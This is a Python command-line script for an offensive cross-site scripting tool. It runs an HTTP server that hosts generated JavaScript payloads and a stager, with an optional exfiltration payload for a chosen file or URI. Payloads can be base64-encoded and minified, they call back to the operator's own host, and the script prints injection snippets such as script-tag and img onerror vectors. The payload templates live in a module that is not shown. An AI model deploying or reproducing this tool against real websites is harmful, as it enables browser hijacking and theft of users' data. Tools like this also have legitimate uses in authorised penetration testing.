#!/usr/bin/env python3
import argparse
import colorlog
import jsbeautifier
import logging
import netifaces
import socket
import sys

from http.server import HTTPServer

from payload import Payload
from httpserver import Handler
from logger import logger, set_log_level, display_message

def gen_payload(addr,port,args):
  p = Payload()

  p.addr = addr
  p.port = port
  p.base64 = args.b64
  p.minimize = args.min
  p.filename = args.filename
  p.exfil_uri = args.exfil

  if args.file:
    p.from_file = args.file
    payload = p.generate_from_file()
  elif args.payload:
    p.from_string = args.payload
    payload = p.generate_from_string()
  else:
    if args.exfil:
      p.exfil_uri = args.exfil
      p.name = 'exfil'
    elif args.tiny:
      p.name = 'smol'
    else:
      p.name = 'default'
    payload = p.generate()

  return payload

def gen_stager(addr,port,args):
  p = Payload()
  p.addr = addr
  p.port = port
  p.base64 = args.b64
  p.minimize = args.min
  p.filename = args.filename
  p.name = 'stager'
  payload = p.generate()
  return payload

def show_hints(payload,url=None):
    hints = []
    if url:
      hints.append(f"<script src=\"{url}\"></script>")
    hints.append(f"<script>{payload}</script>")
    hints.append(f"<img src=x onerror='{payload}'/>")
    
    delim = "\n-----\n"
    #display_message("Payload hints",delim.join(hints))
    display_message("Payload hints",None)
    for num,payload in enumerate(hints):
      display_message(f"{num+1}", payload) 
   
def resolve_listener(l):
  try:
    # it's a valid ip
    socket.inet_aton(l)
    return l
  except OSError as e:
    logger.debug(f"{l} is not a valid IP")
    pass

  try:
    # it's a valid interface
    ip = netifaces.ifaddresses(l)[netifaces.AF_INET][0]['addr']
    return ip
  except Exception as e:
    logger.debug(f"{l} is not a valid interface")
    pass
  
  return None 

def gen_args():
  parser = argparse.ArgumentParser(formatter_class=argparse.ArgumentDefaultsHelpFormatter)
  parser.add_argument('-c','--callback',default='eth0',help="Callback IP or hostname (specify by interface, IP, or hostname)")
  server = parser.add_argument_group('Server')
  server.add_argument('-l','--listen',default='0.0.0.0',help="The IP or interface to listen on")
  server.add_argument('-p','--port',default='8888',help="Port")
  server.add_argument('--filename',default='x.js',help="Filename for payload")
  server.add_argument("--content-type",dest='contenttype',default='text/plain',help="Content-Type header to send") # not sure what the ideal default is - probably application/javascript
  formatting = parser.add_argument_group('Formatting','Options to affect how the payload is constructed and formatted')
  formatting.add_argument('--b64','--base64',action=argparse.BooleanOptionalAction,default=True,help="Base64 encode payload")
  formatting.add_argument("--min",action=argparse.BooleanOptionalAction,default=True,help="JavaScript minimizer using jsmin")
  formatting.add_argument("--beautify",action=argparse.BooleanOptionalAction,default=False,help="JavaScript beautifier on the local console using jsbeautify")
  payloads = parser.add_argument_group('Payloads','Choose from non-default payloads')
  exclusive_group = payloads.add_mutually_exclusive_group()
  exclusive_group.add_argument("-t","--tiny",action=argparse.BooleanOptionalAction,default=False,help="Use alternate minimal default payload")
  exclusive_group.add_argument("-x","--exfil",help="Use alternate exfiltration payload (specify filename/URI to exfil)")
  exclusive_group.add_argument('-f','--file',default=None,help="Load custom payload from file")
  exclusive_group.add_argument('--payload',default=None,help="Load custom payload from argument")
  parser.add_argument("--show-hints",action=argparse.BooleanOptionalAction,default=False,help="Show payload hints at startup")
  parser.add_argument('--loglevel',default='INFO',help="Log level")
  return parser.parse_args()

if __name__ == "__main__":
  args = gen_args()
  set_log_level(logger, args.loglevel)

  logger.debug(args)

  callback = resolve_listener(args.callback)
  if callback == None:
    logger.warning(f"{args.callback} is not a valid callback IP or interface. Hope that's what you wanted to listen on!")
    callback = args.callback

  l = resolve_listener(args.listen)
  if l == None:
    l = '0.0.0.0'
    logger.error(f"{args.listen} is not a valid listener IP or interface - using {l}")

  try:
    port = int(args.port)
  except:
    port = 8888
    logger.error(f"{args.port} is not a valid port - using {port}")

  server = HTTPServer((l,port), Handler)
  logger.info(f"Listening on {l}:{port}")

  server.contenttype = args.contenttype
  server.filename = args.filename
  server.payload = gen_payload(callback, port, args)
  logger.debug(f"Got payload:\n{server.payload}")

  display_url = f"http://{callback}/{server.filename}" if port == 80 else f"http://{callback}:{port}/{server.filename}"
  display_message("Payload URL", display_url)

  display_payload = server.payload
  if args.beautify:
    display_payload = jsbeautifier.beautify(display_payload)
  display_message("Payload", display_payload)
  if args.show_hints:
    show_hints(display_payload,display_url)

  stager = gen_stager(callback, port, args)
  display_message("Stager",stager)
  if args.show_hints:
    show_hints(stager)

  logger.info("Starting...")
  try:
    server.serve_forever()
  except KeyboardInterrupt: 
    pass
  server.server_close()
  sys.exit(0)
